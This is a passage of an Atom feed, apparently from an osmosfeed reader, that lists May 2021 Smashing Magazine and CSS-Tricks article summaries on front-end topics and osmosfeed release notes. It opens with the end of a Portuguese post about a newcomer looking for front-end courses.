- Tem algum curso bom?
- Quais são as melhores escolas?
Saí em busca das respostas, na maravilhosa rede internética mundial de computadores e como nada é simples, muito menos na vida de um newbie, todos os lugares respondiam coisas diferentes.
Mas tinha um consenso. Quer ser Front-End? Aprenda HTML5, CSS e JavaScript. É isso, simples assim, agora voa assombração, se vira.
Mas onde, caral@#%, vou iniciar essa jornada? 🤯
Entre os óbvios, e pagos, que seriam a Alura e a Udemy, encontrei num fórum que não lembro qual (obrigado …]]></summary>
        <author>
            <name>Kenny Alves</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Happy June Vibes For Your Screen (2021 Desktop Wallpapers Edition)]]></title>
        <id>https://smashingmagazine.com/2021/05/desktop-wallpaper-calendars-june-2021/</id>
        <link href="https://smashingmagazine.com/2021/05/desktop-wallpaper-calendars-june-2021/"/>
        <updated>2021-05-31T11:30:00.000Z</updated>
        <summary type="html"><![CDATA[What could be a better way to welcome June than with some colorful inspiration? Well, we might have something for you: wallpapers created with love by artists and designers from across the globe.]]></summary>
        <author>
            <name>hello@smashingmagazine.com (Cosima Mielke)</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Dynamic Favicons for WordPress]]></title>
        <id>https://css-tricks.com/?p=341163</id>
        <link href="https://css-tricks.com/dynamic-favicons-for-wordpress/"/>
        <updated>2021-05-28T14:36:47.000Z</updated>
        <summary type="html"><![CDATA[Typically, a single favicon is used across a whole domain. But there are times you wanna step it up with different favicons depending on context. A website might change the favicon to match the content being viewed. Or a site …
The post Dynamic Favicons for WordPress appeared first on CSS-Tricks.
You can support CSS-Tricks by being an MVP Supporter.]]></summary>
        <author>
            <name>Thomas Park</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Adding A Commenting System To A WYSIWYG Editor]]></title>
        <id>https://smashingmagazine.com/2021/05/commenting-system-wysiwyg-editor/</id>
        <link href="https://smashingmagazine.com/2021/05/commenting-system-wysiwyg-editor/"/>
        <updated>2021-05-28T11:00:00.000Z</updated>
        <summary type="html"><![CDATA[In this article, we’ll be re-using the foundational WYSIWYG Editor built in the first article to build a commenting system for a WYSIWYG Editor that enables users to select text inside a document and share their comments on it. Let’s dig in!]]></summary>
        <author>
            <name>hello@smashingmagazine.com (Shalabh Vyas)</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[To $ or Not to $: Displaying Terminal Code Snippets]]></title>
        <id>https://css-tricks.com/?p=341298</id>
        <link href="https://css-tricks.com/to-or-not-to-displaying-terminal-code-snippets/"/>
        <updated>2021-05-27T18:22:11.000Z</updated>
        <summary type="html"><![CDATA[It’s very popular to put a $ on lines that are intended to be a command in code documentation that involves the terminal (i.e. the command line).
Like this:
$ brew install somepackage
The point of that is that it …
The post To $ or Not to $: Displaying Terminal Code Snippets appeared first on CSS-Tricks.
You can support CSS-Tricks by being an MVP Supporter.]]></summary>
        <author>
            <name>Chris Coyier</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[How to Show Images on Click]]></title>
        <id>https://css-tricks.com/?p=341020</id>
        <link href="https://css-tricks.com/how-to-show-images-on-click/"/>
        <updated>2021-05-27T14:25:29.000Z</updated>
        <summary type="html"><![CDATA[Most images on the web are superfluous. If I might be a jerk for a bit, 99% of them aren’t even that helpful at all (although there are rare exceptions). That’s because images don’t often complement the text they’re …
The post How to Show Images on Click appeared first on CSS-Tricks.
You can support CSS-Tricks by being an MVP Supporter.]]></summary>
        <author>
            <name>Robin Rendle</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Rethinking Postgres in a Post-Server World]]></title>
        <id>https://css-tricks.com/?p=340910</id>
        <link href="https://css-tricks.com/rethinking-postgres-in-a-post-server-world/"/>
        <updated>2021-05-27T14:23:23.000Z</updated>
        <summary type="html"><![CDATA[Serverless architectures have brought engineering teams a great number of benefits. We get simpler deployments, automatic and infinite scale, better concurrency, and a stateless API surface. It’s hard to imagine going back to the world of managed services, broken local …
The post Rethinking Postgres in a Post-Server World appeared first on CSS-Tricks.
You can support CSS-Tricks by being an MVP Supporter.]]></summary>
        <author>
            <name>Michael Rispoli</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Useful VS Code Extensions For Front-End Developers]]></title>
        <id>https://smashingmagazine.com/2021/05/useful-vs-code-extensions-web-developers/</id>
        <link href="https://smashingmagazine.com/2021/05/useful-vs-code-extensions-web-developers/"/>
        <updated>2021-05-27T13:30:00.000Z</updated>
        <summary type="html"><![CDATA[Meet useful Visual Studio Code extensions for web developers: little helpers to minimize slow-downs and frustrations, and boost developer’s workflow along the way. With auto log messages, auto code formatting, file utils, file labels, code snippets, highlight brackets, tags, indents and workspaces, onboarding and remote SSH.]]></summary>
        <author>
            <name>hello@smashingmagazine.com (Cosima Mielke)</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[How To Build And Launch Powerful Responsive Websites With Editor X]]></title>
        <id>https://smashingmagazine.com/2021/05/build-launch-responsive-websites-editorx/</id>
        <link href="https://smashingmagazine.com/2021/05/build-launch-responsive-websites-editorx/"/>
        <updated>2021-05-27T09:30:00.000Z</updated>
        <summary type="html"><![CDATA[While web builders have been around for a long time, it wasn’t until recently that they became practical for professional use. Closing the gap between design and code has become the north star for many companies and we are seeing a wave of tools that deliver on this promise.]]></summary>
        <author>
            <name>hello@smashingmagazine.com (Miroslav Bekyarov)</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Awesome Standalone (Web Components)]]></title>
        <id>https://css-tricks.com/?p=339759</id>
        <link href="https://css-tricks.com/awesome-standalone-web-components/"/>
        <updated>2021-05-26T17:56:34.000Z</updated>
        <summary type="html"><![CDATA[In his last An Event Apart talk, Dave made a point that it’s really only just about right now that Web Components are becoming a practical choice for production web development. For example, it has only been about a year …
The post Awesome Standalone (Web Components) appeared first on CSS-Tricks.
You can support CSS-Tricks by being an MVP Supporter.]]></summary>
        <author>
            <name>Chris Coyier</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Accessible SVGs: Perfect Patterns For Screen Reader Users]]></title>
        <id>https://smashingmagazine.com/2021/05/accessible-svg-patterns-comparison/</id>
        <link href="https://smashingmagazine.com/2021/05/accessible-svg-patterns-comparison/"/>
        <updated>2021-05-26T13:20:00.000Z</updated>
        <summary type="html"><![CDATA[Discover which SVG patterns we should avoid and which patterns are the most inclusive when comparing different combinations of OSs, browsers, and screen readers.]]></summary>
        <author>
            <name>hello@smashingmagazine.com (Carie Fisher)</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[v1.9.0]]></title>
        <id>https://github.com/osmoscraft/osmosfeed/releases/tag/v1.9.0</id>
        <link href="https://github.com/osmoscraft/osmosfeed/releases/tag/v1.9.0"/>
        <updated>2021-05-26T06:02:55.000Z</updated>
        <summary type="html"><![CDATA[Added: experimental support for iTunes podcast feed: Demo | Source. With this new release, you can render an audio control to play the mp3 file and display iTunes episode duration. It is "experimental" due to these caveats:

This feature is currently only available through custom template.
iTunes has no strict format requirement for duration. The unit is most likely seconds but can be "hh:mm:ss" or "mm:ss" for some sources. A future version may expose a human readable string to the template.
No image support yet. Some shows might have disabled CORS or use a relative URL for image, which forces osmosfeed to download the image during build. A future version may support it.
You can't republish the podcast in the feed output. Supporting this goes beyond the scope of the project at the moment.
Fixed: the articles in template data were not sorted.
Thank you @Zenigata]]></summary>
        <author>
            <name>Release notes from osmosfeed</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[A Guide To Undoing Mistakes With Git (Part 2)]]></title>
        <id>https://smashingmagazine.com/2021/05/undoing-mistakes-git-part2/</id>
        <link href="https://smashingmagazine.com/2021/05/undoing-mistakes-git-part2/"/>
        <updated>2021-05-25T14:00:00.000Z</updated>
        <summary type="html"><![CDATA[Mistakes. These cruel villains do not even stop at the beautiful world of software development. But although we cannot avoid making mistakes, we can learn to undo them! This post will show the right tools for your daily work with Git.]]></summary>
        <author>
            <name>hello@smashingmagazine.com (Tobias Günther)</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[A New Way To Reduce Font Loading Impact: CSS Font Descriptors]]></title>
        <id>https://smashingmagazine.com/2021/05/reduce-font-loading-impact-css-descriptors/</id>
        <link href="https://smashingmagazine.com/2021/05/reduce-font-loading-impact-css-descriptors/"/>
        <updated>2021-05-25T09:30:00.000Z</updated>
        <summary type="html"><![CDATA[Web fonts are often terrible for web performance and none of the font loading strategies are particularly effective to address that. Upcoming font options may finally deliver on the promise of making it easier to align fallback fonts to the final fonts.]]></summary>
        <author>
            <name>hello@smashingmagazine.com (Barry Pollard)</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[CSS Container Queries: Use-Cases And Migration Strategies]]></title>
        <id>https://smashingmagazine.com/2021/05/css-container-queries-use-cases-migration-strategies/</id>
        <link href="https://smashingmagazine.com/2021/05/css-container-queries-use-cases-migration-strategies/"/>
        <updated>2021-05-24T11:30:00.000Z</updated>
        <summary type="html"><![CDATA[CSS Container queries bring media queries closer to the target elements themselves and enables them to adapt to virtually any given container or layout. In this article, we’re going to cover CSS container query basics and how to use them today with progressive enhancement or polyfills.]]></summary>
        <author>
            <name>hello@smashingmagazine.com (Adrian Bece)</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[v1.8.1]]></title>
        <id>https://github.com/osmoscraft/osmosfeed/releases/tag/v1.8.1</id>
        <link href="https://github.com/osmoscraft/osmosfeed/releases/tag/v1.8.1"/>
        <updated>2021-05-23T05:40:12.000Z</updated>
        <summary type="html"><![CDATA[Fixed: UnhandledPromiseRejectionWarning: Error: At least one option must be a string]]></summary>
        <author>
            <name>Release notes from osmosfeed</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[v1.8.0]]></title>
        <id>https://github.com/osmoscraft/osmosfeed/releases/tag/v1.8.0</id>
        <link href="https://github.com/osmoscraft/osmosfeed/releases/tag/v1.8.0"/>
        <updated>2021-05-23T05:12:08.000Z</updated>
        <summary type="html"><![CDATA[Changed: Smart summary truncation. When there is no dedicated summary (only Atom feed has it, and many sites don't use it) from the source, we check if the content/description (Both Atom and RSS) field is long enough to be full text. If so, it will be truncated into a "pseudo" summary. If not, we assume the source used the content field as summary, and it will be displayed in full length.
Thank you: @LooperXX.]]></summary>
        <author>
            <name>Release notes from osmosfeed</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Building A Rich Text Editor (WYSIWYG)]]></title>
        <id>https://smashingmagazine.com/2021/05/building-wysiwyg-editor-javascript-slatejs/</id>
        <link href="https://smashingmagazine.com/2021/05/building-wysiwyg-editor-javascript-slatejs/"/>
        <updated>2021-05-21T11:30:00.000Z</updated>
        <summary type="html"><![CDATA[Let’s build a rich text, WYSIWYG-editor that supports rich text, images, links and some nuanced features from word processing apps. We will use SlateJS to build the shell of the editor and then add a toolbar and custom configurations.]]></summary>
        <author>
            <name>hello@smashingmagazine.com (Shalabh Vyas)</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Boost Your Skills Online: Smashing Workshops On Front-End And Design]]></title>
        <id>https://smashingmagazine.com/2021/05/new-online-workshops-front-end-ux/</id>
        <link href="https://smashingmagazine.com/2021/05/new-online-workshops-front-end-ux/"/>
        <updated>2021-05-20T14:20:00.000Z</updated>
        <summary type="html"><![CDATA[Front-end and design are remarkably complex these days. That’s why we invite kind, smart folks from the community to run online workshops for all of us to learn together. And we have new ones coming up, and we’d like to kindly welcome you to join in.]]></summary>
        <author>
            <name>hello@smashingmagazine.com (Iris Lješnjanin)</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[How To Implement Authentication In Next.js With Auth0]]></title>
        <id>https://smashingmagazine.com/2021/05/implement-authentication-nextjs-auth0/</id>
        <link href="https://smashingmagazine.com/2021/05/implement-authentication-nextjs-auth0/"/>
        <updated>2021-05-20T11:00:00.000Z</updated>
        <summary type="html"><![CDATA[A step-by-step tutorial on adding authentication and authorization to your Next.js apps, with Auth0. We’ll be using a Next.js SDK to connect our application to the Auth0 API and will create the dynamic API route for React.]]></summary>
        <author>
            <name>hello@smashingmagazine.com (Facundo Giuliani)</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Frustrating Design Patterns: Mega-Dropdown Hover Menus]]></title>
        <id>https://smashingmagazine.com/2021/05/frustrating-design-patterns-mega-dropdown-hover-menus/</id>
        <link href="https://smashingmagazine.com/2021/05/frustrating-design-patterns-mega-dropdown-hover-menus/"/>
        <updated>2021-05-19T11:40:00.000Z</updated>
        <summary type="html"><![CDATA[Everything to keep in mind when designing and building a mega-dropdown, common pitfalls, hover entry/exit delays, trajectory triangle technique and SVG path exit areas.]]></summary>
        <author>
            <name>hello@smashingmagazine.com (Vitaly Friedman)</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[How To Create, Edit And Animate SVGs All In One Place With SVGator 3.0]]></title>
        <id>https://smashingmagazine.com/2021/05/create-edit-animate-svg-svgator3/</id>
        <link href="https://smashingmagazine.com/2021/05/create-edit-animate-svg-svgator3/"/>
        <updated>2021-05-18T10:30:00.000Z</updated>
        <summary type="html"><![CDATA[Today, we are taking a closer look at [SVGator 3.0](https://www.svgator.com/?utm_source=article&utm_medium=smashingmag&utm_campaign=svgator3_smashing), a new major release of the popular SVG application that lets you create, edit and animate SVG files and make the best out of what SVG has to offer — from start to finish.]]></summary>
        <author>
            <name>hello@smashingmagazine.com (Mikołaj Dobrucki)</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Smashing Podcast Episode 37 With Adam Argyle: What Is VisBug?]]></title>
        <id>https://smashingmagazine.com/2021/05/smashing-podcast-episode-37/</id>
        <link href="https://smashingmagazine.com/2021/05/smashing-podcast-episode-37/"/>
        <updated>2021-05-18T05:00:00.000Z</updated>
        <summary type="html"><![CDATA[In this episode, we’re talking about VisBug. What is it, and how is it different from the array of options already found in Chrome DevTools? Drew McLellan talks to its creator Adam Argyle to find out.]]></summary>
        <author>
            <name>hello@smashingmagazine.com (Drew McLellan)</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[How We Improved Our Core Web Vitals (Case Study)]]></title>
        <id>https://smashingmagazine.com/2021/05/core-web-vitals-case-study/</id>
        <link href="https://smashingmagazine.com/2021/05/core-web-vitals-case-study/"/>
        <updated>2021-05-17T11:30:00.000Z</updated>
        <summary type="html"><![CDATA[Google’s “Page Experience Update” will start rolling out in June. At first, sites that meet Core Web Vitals thresholds will have a minor ranking advantage in mobile search for all browsers. Search is important to any business, and this is the story of how Beau Hartshorne and his team at Instant Domain Search improved their Core Web Vitals scores.]]></summary>
        <author>
            <name>hello@smashingmagazine.com (Beau Hartshorne)</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[v1.7.2]]></title>
        <id>https://github.com/osmoscraft/osmosfeed/releases/tag/v1.7.2</id>
        <link href="https://github.com/osmoscraft/osmosfeed/releases/tag/v1.7.2"/>
        <updated>2021-05-17T05:32:19.000Z</updated>
        <summary type="html"><![CDATA[⚠ Deprecated: To accommodate the monorepo setup, the node version in all templates/demos/examples has changed from 14 to 16. This is not a breaking change as our compile target is still node 14, and node 16 is backward compatible. We still recommend you start using node-version: "16" in your .github/workflows/update-feed.yaml today to get the performance/security improvements from the newer node. See example
Chore: Reorganize to monorepo with npm workspace.]]></summary>
        <author>
            <name>Release notes from osmosfeed</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[v1.7.1]]></title>
        <id>https://github.com/osmoscraft/osmosfeed/releases/tag/v1.7.1</id>
        <link href="https://github.com/osmoscraft/osmosfeed/releases/tag/v1.7.1"/>
        <updated>2021-05-16T02:33:58.000Z</updated>
        <summary type="html"><![CDATA[Fixed: static files were unnecessarily copied for custom templates.]]></summary>
        <author>
            <name>Release notes from osmosfeed</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[v1.7.0]]></title>
        <id>https://github.com/osmoscraft/osmosfeed/releases/tag/v1.7.0</id>
        <link href="https://github.com/osmoscraft/osmosfeed/releases/tag/v1.7.0"/>
        <updated>2021-05-16T01:42:24.000Z</updated>
        <summary type="html"><![CDATA[Added: templating system. Demo | Source | Docs
Chore: rendering logic refactoring. Adopting functional paradigm.
Thank you @tianheg, @onnyyonn]]></summary>
        <author>
            <name>Release notes from osmosfeed</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Tree-Shaking: A Reference Guide]]></title>
        <id>https://smashingmagazine.com/2021/05/tree-shaking-reference-guide/</id>
        <link href="https://smashingmagazine.com/2021/05/tree-shaking-reference-guide/"/>
        <updated>2021-05-14T10:30:00.000Z</updated>
        <summary type="html"><![CDATA[“Tree-shaking” is a must-have performance optimization when bundling JavaScript. In this article, we dive deeper on how exactly it works and how specs and practice intertwine to make bundles leaner and more performant. Plus, you’ll get a tree-shaking checklist to use for your projects.]]></summary>
        <author>
            <name>hello@smashingmagazine.com (Átila Fassina)</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Frustrating Design Patterns That Need Fixing: Birthday Picker]]></title>
        <id>https://smashingmagazine.com/2021/05/frustrating-design-patterns-birthday-picker/</id>
        <link href="https://smashingmagazine.com/2021/05/frustrating-design-patterns-birthday-picker/"/>
        <updated>2021-05-12T12:42:00.000Z</updated>
        <summary type="html"><![CDATA[In this new series of articles on UX, we take a closer look at some frustrating design patterns and explore better alternatives, along with plenty of examples to keep in mind when building or designing one. Let’s start with an infamous birthday picker.]]></summary>
        <author>
            <name>hello@smashingmagazine.com (Vitaly Friedman)</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Little Smashing Stories]]></title>
        <id>https://smashingmagazine.com/2021/05/little-smashing-stories/</id>
        <link href="https://smashingmagazine.com/2021/05/little-smashing-stories/"/>
        <updated>2021-05-12T08:00:00.000Z</updated>
        <summary type="html"><![CDATA[Today marks the day we sent out our 300th edition of the Smashing Newsletter. This article is a little celebration in which we share little Smashing stories from people working behind the scenes.]]></summary>
        <author>
            <name>hello@smashingmagazine.com (Vitaly Friedman)</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[A Primer On CSS Container Queries]]></title>
        <id>https://smashingmagazine.com/2021/05/complete-guide-css-container-queries/</id>
        <link href="https://smashingmagazine.com/2021/05/complete-guide-css-container-queries/"/>
        <updated>2021-05-11T13:30:00.000Z</updated>
        <summary type="html"><![CDATA[A prototype of the long-awaited CSS container queries has landed in Chrome Canary and is available for experimentation. Let’s look at what problem is being solved, learn how container queries work, and see how they compare with and complement existing CSS features for layout.]]></summary>
        <author>
            <name>hello@smashingmagazine.com (Stephanie Eckles)</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[The Conference Platform We Use For Our Online Events: Hopin]]></title>
        <id>https://smashingmagazine.com/2021/05/smashingconf-conference-platform-hopin/</id>
        <link href="https://smashingmagazine.com/2021/05/smashingconf-conference-platform-hopin/"/>
        <updated>2021-05-11T10:00:00.000Z</updated>
        <summary type="html"><![CDATA[At the beginning of 2020, the SmashingConf team was ready for a new year. We had so many things that excited us. New speakers, new workshops, new cities, new attendees, new experiences. And as we all know, 2020 had other ideas. With so many people working from home, we thought we would bring our [Smashing workshops](https://smashingconf.com/online-workshops/) from our home offices to yours — but how?]]></summary>
        <author>
            <name>hello@smashingmagazine.com (Amanda Annandale)</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Get Started With React By Building A Whac-A-Mole Game]]></title>
        <id>https://smashingmagazine.com/2021/05/get-started-whac-a-mole-react-game/</id>
        <link href="https://smashingmagazine.com/2021/05/get-started-whac-a-mole-react-game/"/>
        <updated>2021-05-10T11:00:00.000Z</updated>
        <summary type="html"><![CDATA[Want to get started with React but struggling to find a good place to start? This article should have you covered. We’ll focus on some of the main concepts of React and then we’ll be building a game from scratch!]]></summary>
        <author>
            <name>hello@smashingmagazine.com (Jhey Tompkins)</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[v1.4.0]]></title>
        <id>https://github.com/osmoscraft/osmosfeed/releases/tag/v1.4.0</id>
        <link href="https://github.com/osmoscraft/osmosfeed/releases/tag/v1.4.0"/>
        <updated>2021-05-10T08:55:42.000Z</updated>
        <summary type="html"><![CDATA[Added: Basic theme customization: Demo | Source | Docs.]]></summary>
        <author>
            <name>Release notes from osmosfeed</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[v1.6.0]]></title>
        <id>https://github.com/osmoscraft/osmosfeed/releases/tag/v1.6.0</id>
        <link href="https://github.com/osmoscraft/osmosfeed/releases/tag/v1.6.0"/>
        <updated>2021-05-10T08:15:20.000Z</updated>
        <summary type="html"><![CDATA[Added: Link from the title of a subscription to its website.
Added: Store feedUrl and siteUrl for each source in cache.
Added: Semantic element (<time>) for timestamp on the UI.
Added: Semantic API for theming the default template. Demo | Source | Docs
Changed: Moved feed metadata from article level to feed level in cache.
Fixed: Any html-like text was stripped from title. Fixed with encoded text.
Removed: href for each source in cache. The value was never used so it's not a breaking change.]]></summary>
        <author>
            <name>Release notes from osmosfeed</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[v1.5.0]]></title>
        <id>https://github.com/osmoscraft/osmosfeed/releases/tag/v1.5.0</id>
        <link href="https://github.com/osmoscraft/osmosfeed/releases/tag/v1.5.0"/>
        <updated>2021-05-08T05:16:47.000Z</updated>
        <summary type="html"><![CDATA[Added: Atom feed generator
Added: Customizable site title
Added: Copy all files from static directory to the root of the site.
Changed: Favicon, css, and js assets now existing at site root level.
Chore: Excluded testing files from repo.]]></summary>
        <author>
            <name>Release notes from osmosfeed</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[How To Organize Product-Related Assets And Collaborate Better]]></title>
        <id>https://smashingmagazine.com/2021/05/product-records-organization-collaboration-best-practices/</id>
        <link href="https://smashingmagazine.com/2021/05/product-records-organization-collaboration-best-practices/"/>
        <updated>2021-05-07T10:00:00.000Z</updated>
        <summary type="html"><![CDATA[How do you organize your Google Drive assets? How do you name your Dropbox Paper documents? How do you deal with comments? Let’s get it right.]]></summary>
        <author>
            <name>hello@smashingmagazine.com (Valeriia Panina)</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Improving The Performance Of Shopify Themes (Case Study)]]></title>
        <id>https://smashingmagazine.com/2021/05/improving-performance-shopify-themes-case-study/</id>
        <link href="https://smashingmagazine.com/2021/05/improving-performance-shopify-themes-case-study/"/>
        <updated>2021-05-06T11:00:00.000Z</updated>
        <summary type="html"><![CDATA[When dealing with themes for large platforms and CMS, legacy issues often become a bottleneck. In this article, Carson Shold discusses how his team improved the performance and organization of their Shopify themes, and improved maintainability along the way.]]></summary>
        <author>
            <name>hello@smashingmagazine.com (Carson Shold)</name>
        </author>
    </entry>
</feed>